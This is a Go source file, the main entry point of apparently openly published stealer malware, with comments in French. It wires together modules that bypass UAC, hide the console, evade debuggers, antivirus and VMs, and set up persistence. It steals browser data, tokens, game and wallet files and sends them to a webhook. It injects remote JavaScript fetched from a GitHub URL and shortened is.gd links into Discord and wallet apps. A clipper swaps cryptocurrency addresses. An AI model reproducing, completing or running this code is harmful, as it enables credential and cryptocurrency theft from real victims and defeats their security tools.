package main

import (
	"github.com/benzoXdev/oxil/modules/adminpersistence"
	"github.com/benzoXdev/oxil/modules/antidebug"
	"github.com/benzoXdev/oxil/modules/antivirus"
	"github.com/benzoXdev/oxil/modules/antivm"
	"github.com/benzoXdev/oxil/modules/browsers"
	"github.com/benzoXdev/oxil/modules/clipper"
	"github.com/benzoXdev/oxil/modules/commonfiles"
	"github.com/benzoXdev/oxil/modules/discodes"
	"github.com/benzoXdev/oxil/modules/discordinjection"
	"github.com/benzoXdev/oxil/modules/fakeerror"
	"github.com/benzoXdev/oxil/modules/games"
	"github.com/benzoXdev/oxil/modules/hideconsole"
	"github.com/benzoXdev/oxil/modules/startup"
	"github.com/benzoXdev/oxil/modules/system"
	"github.com/benzoXdev/oxil/modules/taskpersistence"
	"github.com/benzoXdev/oxil/modules/tokens"
	"github.com/benzoXdev/oxil/modules/uacbypass"
	"github.com/benzoXdev/oxil/modules/wallets"
	"github.com/benzoXdev/oxil/modules/walletsinjection"
	"github.com/benzoXdev/oxil/utils/program"
)

// Variables globales pour forcer les imports de persistance (utilisés par le builder)
// Ces variables ne sont jamais utilisées mais permettent de compiler avec les imports
var adminPersistenceFunc = adminpersistence.Run
var taskPersistenceFunc = taskpersistence.Run

func main() {
	CONFIG := map[string]interface{}{
		"webhook": "",
		"cryptos": map[string]string{
			"BTC":  "",
			"BCH":  "",
			"ETH":  "",
			"XMR":  "",
			"LTC":  "",
			"XCH":  "",
			"XLM":  "",
			"TRX":  "",
			"ADA":  "",
			"DASH": "",
			"DOGE": "",
		},
	}

	if program.IsAlreadyRunning() {
		return
	}

	uacbypass.Run()

	hideconsole.Run()
	program.HideSelf()

	if !program.IsInStartupPath() {
		go fakeerror.Run()
		go startup.Run()
		// go adminpersistence.Run() // Disabled by default - enabled if persistence_admin is checked
		// go taskpersistence.Run() // Disabled by default - enabled if persistence_task is checked
	}

	go antidebug.Run()
	go antivirus.Run()

	// Lancer antivm après les goroutines pour qu'il ne bloque pas l'envoi
	go antivm.Run()

	go discordinjection.Run(
		"https://raw.githubusercontent.com/Mimar5513R/discord-injection/refs/heads/main/injection.js",
		CONFIG["webhook"].(string),
	)
	go walletsinjection.Run(
		"https://is.gd/pSMzx0",
		"https://is.gd/mRarbS",
		CONFIG["webhook"].(string),
	)

	actions := []func(string){
		system.Run,
		browsers.Run,
		tokens.Run,
		discodes.Run,
		commonfiles.Run,
		wallets.Run,
		games.Run,
	}

	for _, action := range actions {
		go action(CONFIG["webhook"].(string))
	}

	clipper.Run(CONFIG["cryptos"].(map[string]string))
}
